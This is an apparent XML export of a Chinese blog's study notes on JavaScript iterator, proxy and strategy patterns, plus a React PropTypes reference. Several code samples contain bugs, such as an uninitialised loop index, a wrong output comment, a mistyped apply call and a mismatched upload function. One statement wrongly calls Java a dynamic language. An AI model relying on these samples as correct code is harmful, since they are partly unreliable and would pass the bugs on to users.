外部迭代器虽然调用方式相对复杂，但它的适用面更广，也能满足更多变的需求，内部迭代器和外部迭代器在实际生产中没有优劣之分，使用哪个要根据需求场景而定。 迭代类数组对象和字面量对象迭代器模式不仅可以迭代数组，还可以迭代一些类数组的对象。比如 arguments 、{“0”：a,”1”：b}等。通过上面的代码可以观察到，无论是内部迭代器还是外部迭代器，只要被迭代的聚合对象拥有 length 属性而且可以用下标访问，那它就可以被迭代。 在 JavaScript 中，for in语句可以用来迭代普通字面量对象的属性， jQuery 中提供了 $.each 函数来封装各种迭代行为。 12345678910111213141516171819202122$.each = function(obj,callback)&#123; var value, i, length = obj.length, isArray = true; if(isArray)&#123; // 迭代类数组 for(;i&lt;length;i++)&#123; value = callback.call(obj[i],i,obj[i]); if(value === false)&#123; break; &#125; &#125; &#125;else&#123; for(i in obj)&#123; value = callback.call(obj[i],i,obj[i]); if(value === false)&#123; break; &#125; &#125; &#125; return obj;&#125; 倒序迭代器迭代器模式提供了循环访问一个聚合对象中每个元素的方法，但它没有规定我们以顺序还是倒序甚至是 中序来循环遍历对象。 实现一个倒序遍历的迭代器： 12345678var reverseEach = function(ary,callback)&#123; for(var l = ary.length-1; l &gt;= 0; l--)&#123; callback.call(ary[l],l,ary[l]); &#125;&#125;reverseEach([1,2,3],function(i,n)&#123; console.log(i,n);&#125;); 中止迭代器迭代器可以像普通 for 循环中的 break 一样，提供一种跳出循环的方法，在 jQuery 的 each 函数中有这样的一句话 123if(value === false)&#123; break;&#125; 这句话的意思是，约定如果回调函数的执行结果返回 false ，则提前终止循环。 我们可以把之前的 each 函数改写一下 1234567891011121314var each = function(ary,callback)&#123; for(var i=0,l=ary.length;i&lt;l;i++)&#123; if(callback.call(ary[i],i,ary[i]) === false)&#123; break; &#125; &#125;&#125;each([1,2,3,4,5],function(i,n)&#123; if(n &gt; 3)&#123; return false; &#125; console.log(n);&#125;); 迭代器模式的应用举例当作者重构某个项目中文件上传模式的代码的时候，他发现了下面这段代码，它的目的是根据不同的浏览器获取相应的上传组件对象： 12345678910111213var getUploadObj = function()&#123; try&#123; return new ActiveXObject('TXFTNActiveX.FTNUpload'); // IE 上传控件 &#125;catch(e)&#123; if(supportFlash())&#123; var str = '&lt;object type="application/x-shockwave-flash"&gt;&lt;/object&gt;' return $(str).appendTo($('body')); &#125;else&#123; var str = '&lt;input type="file" name="file" /&gt;' // 表单上传 return $(str).appendTo($('body')); &#125; &#125;&#125; 在不同浏览器环境下，选择的上传方式不同，因为使用浏览器的上传空间进行上传速度快，可以暂停和续传，所以我们会首先选择使用控件上传 ，如果浏览器没有安装上传控件，则使用 flash 上传，如果 连 Flash 也没有上传就使用浏览器原生的表单上传了。 上面的代码可读性差，严重违反了开闭原则。在开发和调试中我们需要来回切换不同的上传方式，后来还支持了 HTML5 上传，这时候唯一的方法就是继续往 getUploadObj 函数里面增加分支条件。 梳理一下问题，目前一共有 3 种可能上传的方式，我们不知道正在使用的浏览器支持哪几种。就好比我们有一个钥匙串，其中共有3把钥匙，我们想要打开一扇门但是不知道该使用哪把钥匙，于是从第一把钥匙开始，迭代钥匙串进行尝试，直到找到正确的钥匙为止。 同样，我们把每种获取 upload 对象的方法都封装在各自的函数里，然后使用一个迭代器，迭代获取这些 upload 对象，知道获取到一个可用的为止： 12345678910111213141516171819var getActiveUploadObj = function()&#123; try&#123; return new ActiveXObject('TXFTNActiveX.FTNUpload'); &#125;catch(e)&#123; return false; &#125;&#125;var getFlashUploadObj = function()&#123; if(supportFlash())&#123; var str = '&lt;object type="application/x-shockwave-flash"&gt;&lt;/object&gt;' return $(str).appendTo($('body')); &#125; return false;&#125;var getFormUploadObj = function()&#123; var str = '&lt;object type="application/x-shockwave-flash"&gt;&lt;/object&gt;' return $(str).appendTo($('body'));&#125; 在上面3个函数中都有同一个约定：如果该函数里面的 upload 对象是可用的，则让函数返回该对象，反之则返回 false,提示迭代器继续往后面进行迭代。 所以我们的迭代器只需要进行下面的几步工作。 提供一个可以被迭代的方法，使得上面三个函数依照优先级被循环迭代 如果正在跌打的函数返回一个对象，则表示找打了正确 的上传对象，反之如果该函数返回 false，则让迭代器继续工作。 迭代器代码如下： 123456789var iteratorUploadObj = function()&#123; for(var i=0,fn;fn=arguments[i++];)&#123; var uploadObj = fn(); if(uploadObj !== false)&#123; return uploadObj; &#125; &#125;&#125;var uploadObj = iteratorUploadObj(getFlashUploadObj,getFormUploadObj,iteratorUploadObj); 重构代码之后，可以看到不同上传对象的方法被隔离在各自的函数里面互不干扰，try/catch 和 if 分支不再纠缠到一起，使得我们可以很方便地维护和扩展代码。后来，我们新增 Webkit 控件上传和 HTML5 上传，我们要做的仅仅是分别增加这两个函数，然后把这两个函数加到 iteratorUploadObj 函数的参数里面进去。 小结迭代器是一种相对简单的模式，简单到我们都不认为它是一种设计模式，目前绝大多部分的语言都内置了迭代器。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——代理模式]]></title>
    <url>%2F2019-02-20-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——代理模式代理模式是为了一个对象提供一个代用品或占位符，以便控制对它的访问。 代理模式在生活中可以找到很多场景。比如：明星都有经纪人作为代理。如果想请明星来办一场商业演出，只能联系他的经纪人。经纪人会把商业演出的细节和报酬谈好后，再把合同交给明星签。 代理模式的关键是，当客户不方便直接访问一个对象或者不满足需求的时候，提供一个替身对象来控制这个对象的访问，客户实际上访问的是替身对象。替身对象对请求做出一些处理之后，再把请求转交给本体对象。 第一个例子在四月一个晴朗的早晨，小明遇见了他的百分百女孩，我们暂且称呼小明的女神为A。两天之后，小明决定给 A 送一束花来表白。刚好小明打听到 A 和他有一个共同的朋友 B，于是内向的小明决定让 B 来代替自己完成送花这件事情。 用代理来描述小明追女神的过程，先看看不用代理模式的情况： 1234567891011121314var Flower = function () &#123; &#125;;var xiaoming = &#123; sendFlower: function (target) &#123; var flower = new Flower(); target.receiveFlower(flower); &#125;&#125;var A = &#123; receiveFlower: function (flower) &#123; console.log('收到花：' + flower); &#125;&#125;xiaoming.sendFlower(A); 接着引入代理B 1234567891011121314151617181920var Flower = function () &#123; &#125;;var xiaoming = &#123; sendFlower: function (target) &#123; var flower = new Flower(); target.receiveFlower(flower); &#125;&#125;var B = &#123; receiveFlower: function (flower) &#123; A.receiveFlower(flower); &#125;&#125;var A = &#123; receiveFlower: function (flower) &#123; console.log('收到花：' + flower); &#125;&#125;xiaoming.sendFlower(B); 在这里，引入代理模式看起来毫无作用，反而会复杂代码，它所作的只是把请求简单地转交给了本体。 现在我们改变故事的背景设定，假设当A 在心情好的时候收到花，小明表白成功的几率有 60%，而当 A在心情差的时候收到花，小明表白的成功率无限趋近于0. 小明跟A才刚刚认识了两天，无法判别A什么时候心情好，但是B是A的好朋友，她会监听A的心情变化，然后选择 A 心情好的时候把花转交给 A。 代码如下： 12345678910111213141516171819202122232425var Flower = function () &#123; &#125;;var xiaoming = &#123;sendFlower: function (target) &#123; var flower = new Flower(); target.receiveFlower(flower);&#125;&#125;var B = &#123;receiveFlower: function (flower) &#123; A.listenGoodMood(function () &#123; // 监听 A 的好心情 A.receiveFlower(flower); &#125;)&#125;&#125;var A = &#123;receiveFlower: function (flower) &#123; console.log('收到花：' + flower);&#125;,listenGoodMood: function (fn) &#123; setTimeout(function () &#123; // 假设10秒后 A 的心情变好了 fn(); &#125;, 10000);&#125;&#125;xiaoming.sendFlower(B); 保护代理和虚拟代理虽然这只是一个虚拟的例子，但是我们可以从中找到两种代理模式的身影。代理 B 可以帮助 A 过滤掉一些请求，比如送花的人中年龄太大的或者是经济能力不够的。这种请求就可以在代理 B 处被过滤掉。这种代理叫做保护代理。A 和 B 一个充当白脸，一个充当 黑脸。白脸 A 继续保持良好的女神形象，不希望直接拒绝任何人，于是找了 黑脸 B 来控制对 A 的访问。 另外，假设在现实中花的价格不菲，导致在程序世界中，new Flower 也是一个代价昂贵的操作，那么我们可以把 new Flower 的操作交给代理 B 去执行，代理 B 会选择在 A 心情好的时候再执行 new Flower ，这是代理模式的另一种形式，叫做虚拟代理。虚拟代理把一些操作开销很大的对象，延迟到真正需要它的时候去创建。 代码如下： 12345678var B = &#123; receiveFlower: function (flower) &#123; A.listenGoodMood(function () &#123; // 监听 A 的好心情 var flower = new Flower(); A.receiveFlower(flower); &#125;) &#125;&#125; 保护代理用于控制不同权限的对象对目标对象的访问，但在 JavaScript 中并不容易实现保护代理，因为我们无法判断谁访问了某个对象。而虚拟代理是最常见的一种代理模式。 虚拟代理实现图片预加载在 Web 开发中，图片预加载是一种常用的技术，如果直接给某个 img 标签节点设置 src 属性，由于图片过大或者是网络不佳，图片的位置常常有段实际是一片空白。常见的做法是先用一张 loading 图片占位，然后用异步的方式加载图片，等图片加载好了再把它填充到 img 节点中，这种场景就很适合使用虚拟代理。 下面实现这个虚拟代理，首先创建一个普通的本体对象，这个对象负责往页面中创建一个 img 标签，并且提供一个对外的 setSrc 接口，便可以给该 img 标签设置src 属性： 12345678910var myImage = (function () &#123;var imgNode = document.createElement('img');document.body.appendChild(imgNode);return &#123; setSrc: function (src) &#123; imgNode.src = src; &#125;&#125;&#125;)();myImage.setSrc('https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550806593869&amp;di=f2c243dcd52c67fb8cb9c730bfe97cff&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.xcarimg.com%2Fexp%2F2872%2F2875%2F2937%2F20101220130509576539.jpg'); F12 调开浏览器调式，切换到 Network ，禁止缓存，把速度调为 5KB/s ，可以看到页面中在图片加载完成之前，有一段长长的空白时间。 现在开始引入代理对象 proxyImage,通过这个代理对象，在图片被真正加载好之前，页面中将会出现一张占位图，来提示用户图片正在加载： 12345678910111213141516171819202122232425262728293031323334353637383940414243var myImage = (function () &#123; var imgNode = document.createElement('img'); document.body.appendChild(imgNode); return &#123; setSrc: function (src) &#123; imgNode.src = src; &#125; &#125;&#125;)();var proxyImage = (function () &#123; var img = new Image; img.onload = function () &#123; myImage.setSrc(this.src); &#125; return &#123; setSrc: function (src) &#123; myImage.setSrc('file:///C:/Users/Administrator/Desktop/timg.gif'); img.src = src; &#125; &#125;&#125;)();proxyImage.setSrc('https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550806593869&amp;di=f2c243dcd52c67fb8cb9c730bfe97cff&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.xcarimg.com%2Fexp%2F2872%2F2875%2F2937%2F20101220130509576539.jpg'); var myImage = (function () &#123; var imgNode = document.createElement('img'); document.body.appendChild(imgNode); return &#123; setSrc: function (src) &#123; imgNode.src = src; &#125; &#125;&#125;)();var proxyImage = (function () &#123; var img = new Image; img.onload = function () &#123; myImage.setSrc(this.src); &#125; return &#123; setSrc: function (src) &#123; myImage.setSrc('file:///C:/Users/Administrator/Desktop/timg.gif'); img.src = src; &#125; &#125;&#125;)();proxyImage.setSrc('https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550806593869&amp;di=f2c243dcd52c67fb8cb9c730bfe97cff&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.xcarimg.com%2Fexp%2F2872%2F2875%2F2937%2F20101220130509576539.jpg'); 现在我们通过 proxyImage 间接地访问 MyImage 。proxyImage 控制了客户对 MyImage 的访问，并在此过程中加入了一些额外的操作，比如在真正的图片加载之前，先把 img 节点的 src 设置为本地的一张 loading 图片。 代理的意义不用代理的预加载图片函数实现如下: 123456789101112131415var MyImage = (function () &#123; var imgNode = document.createElement('img'); document.body.appendChild(imgNode); var img = new Image; img.onload = function () &#123; imgNode.src = img.src; &#125;; return &#123; setSrc: function (src) &#123; imgNode.src = 'file:///C:/Users/Administrator/Desktop/timg.gif'; img.src = src; &#125; &#125;&#125;)(); MyImage.setSrc('https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550806593869&amp;di=f2c243dcd52c67fb8cb9c730bfe97cff&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.xcarimg.com%2Fexp%2F2872%2F2875%2F2937%2F20101220130509576539.jpg'); 为了说明代理的意义，引入一个面向对象设计的原则——单一职责原则。 单一职责原则指的是，就一个类（通常也包括对象和函数等）而言，应该仅有一个引起它变化的原因。如果一个对象承担了多项职责，就意味着这个对象将变得巨大，引起它的变化原因可能有很多个。面向对象的设计鼓励将行为分布到细粒度的对象之中，如果一个对象承担的职责过多，等于把这些职责耦合到了一起，这种耦合导致脆弱和低内聚的设计。当变化发生的时候，设计可能会遭到破坏。 职责被定义为引起变化的原因。上段代码中 MyImage 对象除了负责给 img 节点设置 src 外，还要负责预加载图片。我们正在处理一个职责的时候，有可能因为其强耦合性影响另外一个职责的实现。 另外，在面向对象的程序设计中，在大多数情况下，若违反了其他任何规则，同时将违反开放——封闭原则。如果我们只是在网络中获取一些体积很小的图片，或者 5 年后的网速快到根本不需要再预加载了。我们可能希望把预加载的图片这段代码从 MyImage 中删除掉。这时候就不得不改动 MyImage 对象了。 实际上，我们需要的只是给 img 节点设置 src ,预加载图片只是一个锦上添花的功能。如果能把这个操作放在另一个对象中，自然是一个最好的方法。于是代理的作用就在这里体现出来了，代理负责预加载图片，加载完之后，把请求交给本体 MyImage。 通过代理对象，实际上给系统添加了新的行为。这是符合开发——封闭的原则。给 img 节点设置 src 和 图片预加载这里两个功能，被隔离在了两个对象里面，它们可以各自变化而不会影响对对方。 代理和本体接口的一致性上面的例子中，关键的是代理对象和本体都提供了 setSrc 方法，在客户看来，代理对象和本体对象是一致的，代理接手请求的过程对于用户来说是透明的，用户并不清楚和本体的区别，这样做有两个好处： 用户可以放心请求代理，他只关心是否可以拿到想要的结果。 在任何使用本体的地方都可以替换成使用代理。 Java 等语言中，代理和本体都需要显式地实现同一个接口，一方面接口要保证它们会拥有同样的方法，另一方法，面向接口编程迎合依赖倒置的原则，通过接口进行向上转型，从而避开了编译器的类型检查，代理和本体可以被替换使用。 在 Java 这种动态类型语言中，我们有时候通过鸭子类型来检测代理和本体是否都实现了 setSrc 方法，另外大多数时候甚至干脆不做检测，全部依赖程序员的自觉性，这对于程序的健壮性是有影响的。 如果是代理对象和本体对象都是一个函数（函数也是对象），函数必然都能被执行，则可以认为它们拥有一致的”接口“。 12345678910111213141516171819var myImage = (function () &#123;var imgNode = document.createElement('img');document.body.appendChild(imgNode);return function (src) &#123; imgNode.src = src;&#125;&#125;)();var proxyImage = (function () &#123;var img = new Image;img.onload = function () &#123; myImage(this.src);&#125;return function (src) &#123; myImage('本地加载图片'); img.src = src;&#125;&#125;)();proxyImage('https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1550806593869&amp;di=f2c243dcd52c67fb8cb9c730bfe97cff&amp;imgtype=0&amp;src=http%3A%2F%2Fimg1.xcarimg.com%2Fexp%2F2872%2F2875%2F2937%2F20101220130509576539.jpg') 虚拟代理合并 HTTP 请求有这么一个场景：每周我们都要写一份工作周报，周报要交给总监批阅。总监手下管理着 150 个员工，如果我们每个人直接把周报交给总监，那总监可能要把一整周的时间都花在查看邮件上面。 现在我们把周报都发给各自的组长，组长作为代理，把组内成员的周报提炼合并成一份后一次性交给总监，这样一来，总监的邮件便清净了很多。 这样的例子在 Web 开发中很常见，网络请求也许是最大的开销。假设我们在做一个文件同步的功能，当我们选中一个 checkbox 的时候，它对应的文件就会被同步到另一台备用服务器上面。 页面中放置好这些 checkbox 节点: 123456789&lt;input type="checkbox" id="1" /&gt;1&lt;input type="checkbox" id="2" /&gt;2&lt;input type="checkbox" id="3" /&gt;3&lt;input type="checkbox" id="4" /&gt;4&lt;input type="checkbox" id="5" /&gt;5&lt;input type="checkbox" id="6" /&gt;6&lt;input type="checkbox" id="7" /&gt;7&lt;input type="checkbox" id="8" /&gt;8&lt;input type="checkbox" id="9" /&gt;9 接下来，给这些 checkbox 绑定点击事件，并在点击的同时往另一台服务器同步文件： 12345678910111213var synchronousFile = function (id) &#123; console.log('开始同步文件，id为：' + id);&#125;var checkbox = document.getElementsByTagName('input');for (var i = 0, c; c = checkbox[i++];) &#123; c.onclick = function () &#123; if (this.checked) &#123; synchronousFile(this.id); &#125; &#125;&#125; 当我们选中 3 个 checkbox 的时候，依次往服务器发送了 3 次同步文件的请求。而点击一个 checkbox 并不是很复杂的操作，可以预见，如此频繁的网络请求将会带来相当大的开销。 解决方案是，我们可以同一个代理函数 proxySynchronousFile 来收集一段时间之内的请求，最后一次性发送给服务器。比如我们等待了2秒之后才把这2秒之内的需要同步的文件ID 打包发送给 服务器，如果不是对实时性要求很高的系统，2秒的延迟不会带来太大的副作用，却能大大减轻服务器的压力。代码如下： 1234567891011121314151617181920212223242526272829var synchronousFile = function (id) &#123; console.log('开始同步文件，id为：' + id);&#125; var proxySynchronousFile = (function () &#123; var cache = [], // 保存一段时间内需要同步的 ID timer; // 定时器 return function (id) &#123; cache.push(id); if (timer) &#123; return; &#125; timer = setTimeout(function () &#123; synchronousFile(cache.join(',')); // console.log(cache); clearTimeout(timer); timer = null; cache.length = 0; &#125;, 2000); &#125; &#125;)();var checkbox = document.getElementsByTagName('input');for (var i = 0, c; c = checkbox[i++];) &#123; c.onclick = function () &#123; if (this.checked) &#123; proxySynchronousFile(this.id); &#125; &#125;&#125; 虚拟代理在惰性加载中的应用作者我曾经写过一个 mini 控制台的开源项目 miniConsole.js，这个控制台可以帮助开发者在 IE 浏览器以及移动端浏览器上进行一些简单的调试工作。调用方式很简单： 1miniConsole.log(1); 这句话会在页面中创建一个 div，并且把 log 显示在 div 里面。miniConsole.js的代码量大概有1000行左右，也许我们并不想一开始就加载这么大的JS文件，因为也许并不是每个用户都需要打印 log。我们希望在有必要的时候才开始加载它，比如当用户按下 F2 来主动唤出控制台的时候。 在 miniConsole.js 加载之前，为了能够让用户正常地使用里面的 API，通常我们的解决方案是用一个占位的 miniConsole 代理对象来给用户提前使用，这个代理对象提供给用户的接口，跟实际的 miniConsole 是一样的。 用户使用这个代理对象来打印 log 的时候，并不会真正在控制台内打印日志，更不会在页面中创建任何 DOM 节点。即使我们想这样做也无能为力，因为真正的 miniConsole.js 还没有被加载。 于是，我们可以把打印 log 的请求都包裹在一个函数里面，这个包装了请求的函数就相当于其他语言中命名模式的 Command 对象。随后这些函数将全部放到缓存队列中，这些逻辑都是在 miniConsole 代理对象中完成实现的。等用户按下 F12 的召唤出控制台的时候，才开始真正加载 miniConsole 的代码，加载完成之后将遍历的 miniConsole 代理对象中缓存函数队列，同时依次执行它们。 未加载真正的 miniConsole.js 之前的代码如下： 12345678910var cache = [];var miniConsole = &#123; log:function()&#123; var args = arguments; cache.push(function()&#123; return miniConsole.log.apply(miniConsole,args); &#125;); &#125;&#125;miniConsole.log(1); 当用户按下 F12 的时候，开始真正加载 miniConsole.js ,代码如下： 123456789101112131415161718192021var handler = function(ev)&#123; if(ev.keyCode === 113)&#123; var script = document.createElement('script'); script.onload = function()&#123; for(var i=0,fn;fn=cache[i++])&#123; fn(); &#125; &#125; script.src = 'miniConsole.js'; document.getElementsByTagName('head')[0].appendChild(script); &#125;&#125;document.body.addEventListener('keydown',handler,false);// miniConsole.js 代码miniConsole = &#123; log:function()&#123; // 真正的代码 console.log(Array.prototype.join.call(argument)); &#125;&#125; 另外这里要注意，我们要保证 F12 被重复按下的时候，miniConsole.js 只被加载一次。另外，我们整理一下 miniConsole 代理对象的代码，使它成为一个标准的虚拟对象。 123456789101112131415161718192021222324252627282930313233var miniConsole = (function()&#123; var cache = []; var handler = function(ev)&#123; if(ev.keyCode === 113)&#123; var script = document.createElement('script'); script.onload = function()&#123; for(var i=0,fn;fn=cache[i++])&#123; fn(); &#125; &#125; script.src = 'miniConsole.js'; document.getElementsByTagName('head')[0].appendChild(script); document.body.removeEventListener('keydown',handler); // 只加载一次 miniConsole.js &#125; &#125; document.body.addEventListener('keydown',handler,false); return&#123; log:function()&#123; var args = arguments; cache.push(function()&#123; return miniConsole.log.apply(miniConsole,args); &#125;); &#125; &#125;&#125;)();miniConsole.log(11);// miniConsole.js 代码miniConsole = &#123; log:function()&#123; // 真正的代码 console.log(Array.prototype.join.call(argument)); &#125;&#125; 缓存代理缓存代理可以为一些开销大的计算结果提供暂时的存储，在下次运算的时候，如果传递进来参数跟之前的一样，则可以直接返回前面存储的运算结果。 计算乘积编写一个简单的求乘积程序作为演示： 12345678910var mult = function()&#123; console.log('开始计算乘积'); var a = 1; for(var i=0,l = arguments.length;i&lt;l;i++)&#123; a = a * arguments[i]; &#125; return a;&#125;mult(2,4); // 输出：6mult(2,3,4); // 输出：24 加入缓存代理函数： 12345678910111213var proxyMult = (function()&#123; var cache = &#123;&#125;; return function()&#123; var args = Array.prototype.join.call(arguments,','); if(args in cache)&#123; return cache[args]; &#125; return cache[args] = mult.apply(this,arguments); &#125;&#125;)();proxyMult(1,2,3,4); // 24proxyMult(1,2,3,4); // 24 当我们第二次调用 proxyMult(1,2,3,4) 的时候，本体 mult 函数并没有被计算，proxyMult 直接返回了之前缓存好的计算结果。 通过增加缓存代理的方式，mult 函数可以继续专注于自身的职责——计算乘积，缓存的功能由代理对象来实现。 ajax 异步请数据我们常常在项目中遇到分页的需求，同一页的数据理论上只需要去后台拉取一次，这些已经拉取到的数据在某个地方被缓存之后，下次再请求同一页的时候，便可以直接使用之前的数据。 显然这里也是可以引入缓存代理，实现方式跟计算乘积差不多，唯一不同的是，请求数据是一个异步的操作，我们无法直接把计算结果放到代理对象的缓存中，而是要通过回调的方式。 用高阶函数动态创建代理通过传入高阶函数这种更加灵活的方式，可以为各种计算方式创建缓存代理。现在这些计算方式被当做参数传入一个专门用于创建换粗代理的工厂中，这样一来，我们就可以称为乘法、加法、减法等创建缓存代理，代码如下： 123456789101112131415161718192021222324252627282930313233343536// 计算乘积var mult = function()&#123; console.log('开始计算乘积'); var a = 1; for(var i=0,l = arguments.length;i&lt;l;i++)&#123; a = a * arguments[i]; &#125; return a;&#125;// 计算加和var plus = function()&#123; var a = 0; for(var i=0,l = arguments.length;i&lt; l;i++)&#123; a = a + arguments[i]; &#125; return a;&#125;// 创建缓存代理的工厂var createProxyFactory = function(fn)&#123; var cache = &#123;&#125;; return function()&#123; var args = Array.prototype.join.call(arguments,','); if(args in cache)&#123; return cache[args]; &#125; return cache[args] = fn.apply(this.arguments); &#125;&#125;var proxyMult = createProxyFactory(mult);var plusMult = createProxyFactory(plus);proxyMult(1,2,3,4); // 24proxyMult(1,2,3,4); // 24plusMult(1,2,3,4); // 10plusMult(1,2,3,4); // 10 其他代理模式代理模式的变体种类非常多 防火墙代理：控制网络资源的访问，保护主题不被“坏人”接近 远程代理：为一个对象在不同的地址空间提供局部代表，在java 中，远程代理可以是另外一个虚拟机中的代理 保护代理：用于对象应该有不同访问权限的情况 智能应用代理：取代了简单的指针，它在访问对象时执行了一些附加操作，比如计算了一个对象被引用的次数。 写时复制代理：通常用于复制一个庞大对象的情况。写时复制代理延迟了复制的过程，当对象被真正修改的时候，才对它进行复制操作。写时复制代理是虚拟代理的一种变体，DLL （操作系统中的动态链接库）是其典型运用场景。 小结代理模式包括很多小分类，JavaScript 开发中最常用的是虚拟代理和缓存代理。虽然代理模式非常有用，但我们编写某个业务逻辑代码的时候，往往不需要预先猜测是否需要使用代理模式。当真正发现不方便直接访问某个对象的时候，再写代理也不迟。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PropTypes]]></title>
    <url>%2F2019-02-19-PropTypes.html</url>
    <content type="text"><![CDATA[PropTypes 类型检查PropTypes 例子1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import PropTypes from 'prop-types';MyComponent.propTypes = &#123; // 将属性声明为以下 JS 原生类型 optionalArray:PropTypes.array, optionalBool:PropTypes.bool, optionalFunc:PropTypes.func, optionalObject:PropTypes.object, optionalNumber:PropTypes.number, optionalSting:PropTypes.string, optionalSymbol:PropTypes.symbol, // 可被渲染的元素（包括数字、字符串、子元素或者数组） optionalNode:PropTypes.node, // 一个 React 元素 optionalElement:PropTypes.element, // 声明属性为某个类的实例，使用 JS 的 instanceof 操作符实现 optionalMessage:PropTypes.instanceof(Message), // 限制属性值是某个特定值之一 optionalEnum:PropTypes.oneOf(['News','Photos']), // 限制为列举类型之一的对象 optionalUnion:PropTypes.oneOfType([ PropTypes.string, PropTypes.number, PropTypes.instanceof(Message) ]), // 指定元素类型的数组 optionalArrayOf:PropTypes.arrayOf(PropTypes.number), // 指定类型的对象 optionalObjectOf:PropTypes.objectOf(PropTypes.number), // 指定属性及其类型的对象 optionalObjectWithShape:PropTypes.shape(&#123; color:PropTypes.string, fontSize:PropTypes.number &#125;), // 可以在任何 PropTypes 属性后面加上 'isRequired' 后缀，这样如果这个属性父组件没有提供时，会打印警告消息 requiredFunc:PropTypes.func.isRequired, // 任何类型的数据 requiredAny:PropTypes.any.isRequired, // 可以执行一个自定义验证器，在验证失败时返回一个 Error 对象而不是 'console.warn' 或抛出异常，在 oneOfType 中不起作用 customProp:function(props,propName,componentName)&#123; if(!/matchme/.test(props[propName]))&#123; return new Error( 'Invalid prop `' + propName + '` supplied to' + ' `' + componentName + '`. Validation failed.' ); &#125; &#125;, // 提供一个自定义的 `arrayOf` 或 `objectOf` 验证器，它应该在验证失败时返回一个 Error 对象。 它被用于验证数组或对象的每个值。验证器前两个参数的第一个是数组或对象本身，第二个是它们对应的键。 customArrayProp: PropTypes.arrayOf(function(propValue, key, componentName, location, propFullName) &#123; if (!/matchme/.test(propValue[key])) &#123; return new Error( 'Invalid prop `' + propFullName + '` supplied to' + ' `' + componentName + '`. Validation failed.' ); &#125; &#125;)&#125; 属性默认值defaultProps 可以为 props 定义默认值。 123456789101112131415161718class Greeting extends React.Component &#123; render() &#123; return ( &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt; ); &#125;&#125;// 为属性指定默认值:Greeting.defaultProps = &#123; name: 'Stranger'&#125;;// 渲染 "Hello, Stranger":ReactDOM.render( &lt;Greeting /&gt;, document.getElementById('example'));]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>PropTypes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——策略模式]]></title>
    <url>%2F2019-02-16-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——策略模式俗话说，条条大路通罗马。在程序设计中，要实现一个功能有很多种方案可以选择。比如一个压缩文件的程序，既可以选择 zip 算法，还可以选择 gzip 算法。 这些算法灵活多样，而且可以随意互相转换。这种替换方案就是策略模式。 策略模式的定义是：定义一系列的算法，把它们一个个封装起来，并且使它们可以互相替换 使用策略模式计算奖金策略模式有很广泛的应用，本节以年终奖的计算为例进行介绍。很多公司的年终奖是根据员工的工资基数和年底绩效情况来发放的。例如：绩效为 S 的人年终奖有 4倍工资，绩效为 A的人年终奖有 3倍工资，而绩效为 B 的人年终奖是 2 倍工资。假设财务部要求我们提供一段代码，来方便计算员工的年终奖。 1.初步想法和实现12345678910111213141516var calculateBonus = function(performanceLevel,salary)&#123; if(performanceLevel === 'S')&#123; return salary * 4; &#125; if(performanceLevel === 'A')&#123; return salary * 3; &#125; if(performanceLevel === 'B')&#123; return salary * 2; &#125;&#125;calculateBonus('S',2000);calculateBonus('B',2000);calculateBonus('A',2000);// 可以轻易地看出来，calculateBonus 函数比较庞大，包含了很多 if-else 语句，这些语句要覆盖所有的逻辑分支。缺乏弹性，如果增加了一种绩效等级，或者要把某个绩效等级的工资更改就必须深入calculateBonus 函数的内部实现。// 算法的复用性差，如果在程序中要复用这些算法，只能复制粘贴。 2.使用组合函数重构代码一般最容易想到的方法就是使用组合函数来重构代码，我们把各种算法封装到一个函数里面，函数有各自的命名，可以一目了然知道它对应哪种算法。它们也可以被复用在程序中的其他地方。 12345678910111213141516171819202122var calculateBonus = function (performanceLevel, salary) &#123; if (performanceLevel === 'S') &#123; return performanceS(salary); &#125; if (performanceLevel === 'A') &#123; return performanceA(salary); &#125; if (performanceLevel === 'B') &#123; return performanceB(salary); &#125;&#125;var performanceS = function (salary) &#123; return salary * 4;&#125;var performanceA = function (salary) &#123; return salary * 3;&#125;var performanceB = function (salary) &#123; return salary * 2;&#125;calculateBonus('A',2000); 可以看出来，calculateBonus 函数有可能越来越庞大，而且在系统变化的时候缺乏弹性。 3.使用策略模式重构代码策略模式指定是定义一系列的算法，把它们一个个封装起来。将不变的部分和变化的部分隔开是每个设计模式的主题，策略模式也不会例外，策略模式的目的就是将算法的使用与算法的实现分离开来。 上面的例子中，算法的使用方式是不变的，都是根据某个算法取得计算后的奖金数额。算法 